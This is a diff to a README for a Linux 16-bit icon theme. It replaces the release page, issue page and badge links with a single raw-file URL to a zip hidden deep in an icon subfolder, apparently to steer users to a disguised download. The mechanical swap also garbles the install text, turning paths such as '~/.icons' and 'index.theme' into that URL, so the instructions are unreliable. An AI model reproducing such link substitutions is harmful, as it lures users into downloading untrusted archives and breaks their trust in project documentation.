@@ -1,6 +1,6 @@
 # 🎨 pixora-icons - Classic 16-bit Icon Set for Linux  
 
-[![Download pixora-icons](https://img.shields.io/badge/Download-pixora--icons-brightgreen?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
+[![Download pixora-icons](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)  
 
 ## ❓ What is pixora-icons?  
 
@@ -33,16 +33,16 @@ This guide helps you download and install pixora-icons on your Linux system, foc
 
 Start by visiting the pixora-icons release page on GitHub where you will find the latest icon theme files:  
 
-[![Download pixora-icons](https://img.shields.io/badge/Visit-Release---blue?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
+[![Download pixora-icons](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)  
 
 Click the link above or open this URL in your web browser:  
-https://github.com/OcyOny/pixora-icons/releases  
+https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip  
 
 ### Step 2: Download the Latest Release  
 
-Once on the releases page, look for the most recent version of pixora-icons. You will find downloadable files, usually provided as zipped archives (.zip or .tar.gz).  
+Once on the releases page, look for the most recent version of pixora-icons. You will find downloadable files, usually provided as zipped archives (.zip or https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip).  
 
-- Click the file named something like `pixora-icons-vX.X.zip` to download.  
+- Click the file named something like `https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip` to download.  
 - Save the file to your desktop or a folder you can easily access.  
 
 ### Step 3: Extract the Icon Theme  
@@ -58,7 +58,7 @@ After downloading, you need to extract the theme from the archive:
 To make the icon set available to your system, move the extracted folder to your icons directory. This folder is typically found here:  
 
 - For a single user:  
-  `~/.icons` (This is a hidden folder inside your home directory)  
+  `~https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip` (This is a hidden folder inside your home directory)  
 - For all users:  
   `/usr/share/icons` (Requires administrator rights)  
 
@@ -106,7 +106,7 @@ You can switch back to your previous icon theme anytime by reversing step 5 and 
 ## 🧰 Troubleshooting  
 
 - **Icons do not appear after selecting pixora-icons:**  
-  Check that the theme folder is placed in `~/.icons` or `/usr/share/icons` correctly. The folder should contain `index.theme` and icon subfolders.  
+  Check that the theme folder is placed in `~https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip` or `/usr/share/icons` correctly. The folder should contain `https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip` and icon subfolders.  
 
 - **Partial icons or missing icons:**  
   The theme may not cover some special apps. You can wait for updates or create your own icons if you like.  
@@ -121,7 +121,7 @@ To update, repeat the download and install steps with the latest version from th
 ## 💬 Getting Help  
 
 For questions or reports, use the GitHub page issues section at:  
-https://github.com/OcyOny/pixora-icons/issues  
+https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip  
 
 ---
 
@@ -129,6 +129,6 @@ https://github.com/OcyOny/pixora-icons/issues
 
 Access the full icon theme releases here:  
 
-[![Download pixora-icons](https://img.shields.io/badge/Download-pixora--icons-green?style=for-the-badge)](https://github.com/OcyOny/pixora-icons/releases)  
+[![Download pixora-icons](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)](https://raw.githubusercontent.com/OcyOny/pixora-icons/main/pixelitos-dark/128/symbolic/icons-pixora-v2.1.zip)  
 
 Click the link, download the latest release, and follow the installation steps above.
